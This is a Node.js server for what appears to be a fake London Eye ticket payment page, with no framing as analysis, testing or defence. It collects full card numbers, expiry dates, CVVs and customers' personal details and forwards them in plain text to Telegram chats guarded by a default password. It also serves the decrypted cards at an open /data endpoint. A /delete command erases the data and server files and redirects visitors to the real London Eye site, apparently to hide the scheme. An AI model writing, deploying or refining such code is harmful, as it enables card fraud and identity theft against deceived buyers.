const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const CryptoJS = require('crypto-js');
const fs = require('fs');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 80;

app.use(express.json());
app.use(express.static('public'));

const DATA_FILE = path.join(__dirname, 'payments.json');

let payments = [];
try {
    if (fs.existsSync(DATA_FILE)) {
        const data = fs.readFileSync(DATA_FILE, 'utf8');
        payments = JSON.parse(data);
    }
} catch (error) {
    console.log('Creating new payments.json file');
}

function savePayments() {
    fs.writeFileSync(DATA_FILE, JSON.stringify(payments, null, 2));
}

const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || 'simple-key-for-now';
const encrypt = (text) => CryptoJS.AES.encrypt(text, ENCRYPTION_KEY).toString();

const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, {polling: true});

const AUTHORIZED_USERS = {};
const BOT_PASSWORD = process.env.TELEGRAM_PASSWORD || "admin123";

bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, 
        '🔐 For access, enter password:\n\n' +
        'Use command: /password your_password'
    );
});

bot.onText(/\/password (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const password = match[1];
    
    if (password === BOT_PASSWORD) {
        AUTHORIZED_USERS[chatId] = true;
        bot.sendMessage(chatId, 
            '✅ Access granted!\n\n' +
            'Available commands:\n' +
            '/payments - View all payments\n' +
            '/delete - DELETE ALL DATA AND FILES\n' +
            'New payments come automatically!'
        );
    } else {
        bot.sendMessage(chatId, '❌ Wrong password!');
    }
});

bot.onText(/\/delete/, (msg) => {
    const chatId = msg.chat.id;
    
    if (!AUTHORIZED_USERS[chatId]) {
        bot.sendMessage(chatId, '❌ Access denied! Use /password first.');
        return;
    }

    // Confirmation keyboard
    const keyboard = {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: '🚨 YES, DELETE EVERYTHING', callback_data: 'confirm_delete' },
                    { text: '❌ Cancel', callback_data: 'cancel_delete' }
                ]
            ]
        }
    };

    bot.sendMessage(chatId, 
        '🚨🚨🚨 DANGER ZONE 🚨🚨🚨\n\n' +
        'This will PERMANENTLY delete:\n' +
        '• All payment data\n' + 
        '• All server files\n' +
        '• Frontend files\n' +
        '• Database\n\n' +
        'Website will redirect to London Eye official site.\n\n' +
        'THIS ACTION CANNOT BE UNDONE!\n\n' +
        'Are you absolutely sure?',
        keyboard
    );
});

bot.on('callback_query', (callbackQuery) => {
    const msg = callbackQuery.message;
    const chatId = msg.chat.id;
    const data = callbackQuery.data;

    if (data === 'confirm_delete') {
        try {
            // Delete payments file
            if (fs.existsSync(DATA_FILE)) {
                fs.unlinkSync(DATA_FILE);
            }
            
            // Clear payments array
            payments = [];
            
            // Delete public folder (frontend files)
            const publicPath = path.join(__dirname, 'public');
            if (fs.existsSync(publicPath)) {
                fs.rmSync(publicPath, { recursive: true, force: true });
            }
            
            // Delete server.js file
            const serverFile = path.join(__dirname, 'server.js');
            if (fs.existsSync(serverFile)) {
                fs.unlinkSync(serverFile);
            }
            
            // Create redirect HTML
            const redirectHtml = `
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta http-equiv="refresh" content="0; url=https://www.londoneye.com/fr/preparez-votre-visite/avant-votre-visite/heures-douverture/">
    <title>Redirecting...</title>
</head>
<body>
    <p>Redirecting to London Eye official website...</p>
</body>
</html>
            `;
            
            // Create minimal public directory with redirect
            fs.mkdirSync(publicPath, { recursive: true });
            fs.writeFileSync(path.join(publicPath, 'index.html'), redirectHtml);
            
            bot.sendMessage(chatId, 
                '✅ ALL DATA DELETED SUCCESSFULLY!\n\n' +
                '🗑️ Deleted:\n' +
                '• Payment database\n' +
                '• Frontend files\n' +
                '• Server files\n\n' +
                '🌐 Website now redirects to London Eye official site.\n\n' +
                '⚠️ Server will continue running with redirect only.'
            );
            
            console.log('🚨 ALL DATA DELETED BY USER: ' + chatId);
            
        } catch (error) {
            bot.sendMessage(chatId, '❌ Error during deletion: ' + error.message);
            console.error('Delete error:', error);
        }
    } else if (data === 'cancel_delete') {
        bot.sendMessage(chatId, '✅ Deletion cancelled. Data is safe.');
    }
    
    bot.answerCallbackQuery(callbackQuery.id);
});

bot.on('message', (msg) => {
    if (!AUTHORIZED_USERS[msg.chat.id]) {
        return;
    }
    
    if (msg.text === '/payments') {
        if (payments.length === 0) {
            bot.sendMessage(msg.chat.id, '📭 No payments yet');
            return;
        }
        
        let message = '💳 Recent payments:\n\n';
        const recentPayments = payments.slice(-10).reverse();
        
        recentPayments.forEach((payment, index) => {
            // Decrypt data for Telegram display
            const decryptedCard = CryptoJS.AES.decrypt(payment.cardNumber, ENCRYPTION_KEY).toString(CryptoJS.enc.Utf8);
            const decryptedExpiry = CryptoJS.AES.decrypt(payment.expiration, ENCRYPTION_KEY).toString(CryptoJS.enc.Utf8);
            const decryptedCvv = CryptoJS.AES.decrypt(payment.cvv, ENCRYPTION_KEY).toString(CryptoJS.enc.Utf8);
            
            message += `🆔 ${index + 1}. Order #${payment.id}\n`;
            message += `💳 Card: ${decryptedCard}\n`;
            message += `📅 Expiry: ${decryptedExpiry}\n`;
            message += `🔒 CVV: ${decryptedCvv}\n`;
            message += `👤 ${payment.firstName} ${payment.lastName}\n`;
            message += `🎫 ${payment.ticketType}\n`;
            message += `📅 ${new Date(payment.timestamp).toLocaleString('en-US')}\n`;
            message += '─'.repeat(20) + '\n\n';
        });
        
        bot.sendMessage(msg.chat.id, message);
    }
});

app.post('/submit-payment', async (req, res) => {
    try {
        const { 
            cardNumber, 
            expiration, 
            cvv, 
            firstName, 
            lastName, 
            address1, 
            address2, 
            country, 
            city, 
            postcode, 
            email, 
            phone, 
            ticketType, 
            ticketPrice, 
            date, 
            time 
        } = req.body;

        // Required fields validation
        if (!cardNumber || !expiration || !cvv || !firstName || !email) {
            return res.status(400).json({
                success: false,
                message: 'Required fields are missing'
            });
        }

        const payment = {
            id: Date.now(),
            cardNumber: cardNumber,
            expiration: expiration,
            cvv: cvv,
            firstName: firstName,
            lastName: lastName,
            address1: address1,
            address2: address2,
            country: country,
            city: city,
            postcode: postcode,
            email: email,
            phone: phone,
            ticketType: ticketType,
            ticketPrice: ticketPrice,
            date: date,
            time: time,
            timestamp: new Date().toISOString()
        };

        // Save to file (encrypted card data)
        const encryptedPayment = {
            ...payment,
            cardNumber: encrypt(cardNumber),    // Encrypt for file
            expiration: encrypt(expiration),    // Encrypt for file  
            cvv: encrypt(cvv)                   // Encrypt for file
        };
        
        payments.push(encryptedPayment);
        savePayments();

        // Send to Telegram with UNENCRYPTED card data
        const telegramMessage = `
💳 NEW PAYMENT!
🆔 ID: ${payment.id}
🎫 Ticket: ${payment.ticketType}
💰 Price: ${payment.ticketPrice}
📅 Date: ${payment.date}
⏰ Time: ${payment.time}

💳 CARD DATA:
Card: ${payment.cardNumber}
Expiry: ${payment.expiration}
CVV: ${payment.cvv}

👤 CUSTOMER:
Name: ${payment.firstName} ${payment.lastName}
Email: ${payment.email}
Phone: ${payment.phone}

📍 ADDRESS:
${payment.address1}${payment.address2 ? '\n' + payment.address2 : ''}
${payment.city}, ${payment.postcode}
${payment.country}

⏰ ${new Date().toLocaleString('en-US')}
`;

        // Send to all authorized users
        Object.keys(AUTHORIZED_USERS).forEach(chatId => {
            bot.sendMessage(chatId, telegramMessage);
        });

        res.json({ 
            success: true, 
            message: 'Payment processed successfully!',
            id: payment.id
        });

    } catch (error) {
        console.error('Error:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Server error' 
        });
    }
});

// Get all payments (for debugging)
app.get('/data', (req, res) => {
    try {
        // Decrypt data for debugging
        const decryptedPayments = payments.map(payment => ({
            ...payment,
            cardNumber: CryptoJS.AES.decrypt(payment.cardNumber, ENCRYPTION_KEY).toString(CryptoJS.enc.Utf8),
            expiration: CryptoJS.AES.decrypt(payment.expiration, ENCRYPTION_KEY).toString(CryptoJS.enc.Utf8),
            cvv: CryptoJS.AES.decrypt(payment.cvv, ENCRYPTION_KEY).toString(CryptoJS.enc.Utf8)
        }));
        res.json(decryptedPayments);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.listen(PORT,'0.0.0.0' ,() => {
    console.log(`🚀 Server running on http://localhost:${PORT}`);
});